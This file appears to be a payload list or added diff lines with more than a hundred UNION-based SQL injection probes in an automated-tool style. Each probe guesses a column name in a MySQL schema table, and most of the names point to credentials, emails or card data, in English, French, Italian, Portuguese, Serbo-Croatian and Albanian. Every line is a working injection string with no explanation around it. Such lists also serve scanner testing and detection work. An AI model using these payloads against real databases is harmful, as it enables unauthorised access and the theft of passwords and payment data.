+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT motto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JGQk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stichwort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jokZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schlusselwort FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Thep",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT utilisateur FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DCCn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usager FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Jvcl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT consommateur FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nMrd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nom FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vZGX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mot FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QxEG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fDfx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cle FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CuKo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT touche FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TxCg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clef FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WUPs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT utente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ViEf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nome FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LSXG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT utilizzatore FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YMVX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT parola FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wFeC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chiave FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ODyo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tasto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kwKL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pulsante FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ygvu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chiavetta FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MALs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cifrario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MwcW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usufrutuario FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xjex",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chave FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ruyI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cavilha FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CaLH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT korisnik FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nmWF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sifra FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ejAH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lozinka FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZDRf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kljuc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WOqm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `user` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jPOP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Kvvs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cc_number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PXhl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emri FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aitj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fjalekalimi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ksgt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- raGu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customers_email_address FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Bhby",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customers_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aXuK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AFIw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hcsd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_user FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PRXb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CSGJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aLid",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usern FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ESLW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_n FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uRZr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT users FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xoJh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hXvX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logins FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TMDA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_user FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GTED",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_admin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WXyx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FZWr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OScM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_login FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hTYc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT auid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QjMb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT apwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dcpg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eyZQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- utXR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminuser FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QxVk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminuserid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- poCC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_userid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FjGs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminusername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qSwN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pvch",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jzDu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Grfs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WCtD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr_n FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WPiO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FYkS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FuQH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrpass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KPxi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NyPl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrnam FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ttUz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iSnW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT myusername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zcqt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mail FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PreW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emni FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TLqj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logohu FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VDhw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT punonjes FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vTaJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kpro_user FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YWiA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT wp_users FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PkGK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emniplote FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ozcM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT perdoruesi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HvIY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT perdorimi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jOiD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT punetoret FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Agyb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logini FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EQKS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT llogaria FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uprN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fjalekalimin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uMut",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kodi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yZQV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xTQa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ime FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PMNs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT korisnici FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SXZQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xtuc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrator FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BXhF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrator_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VExc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mem_login FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HuEA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YlBM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aZdQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_passwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DBpN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GDfb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT psw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jsKQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pass1word FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XXUR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pass_word FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mBZl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vuXZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pass_w FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HZCQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_passwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qglr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userpass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JVXW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userpassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AvtP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userpwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NcRl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cHoO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT useradmin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zdYp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_admin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QKBu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mypassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FyPM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passwrd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NCoj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QflB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_passwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iGiw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mem_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FMaw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT memlogin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Knqo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT e_mail FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BeFx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xlit",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT u_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oQpU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UmUe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mempassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dDiy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mem_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MjEW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mem_passwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uGlJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mem_pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nHHH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT p_word FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ygzi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZyFI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT p_assword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NRXu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT myname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dfCN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YcLd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BaEp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pBMQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my_email FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TFqA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cvvnumber FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lvem",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT about FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- icVK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT access FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CzlH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT accnt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qSRM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT accnts FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GLTL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT account FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HEJI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wnpk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminemail FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oxoy",1
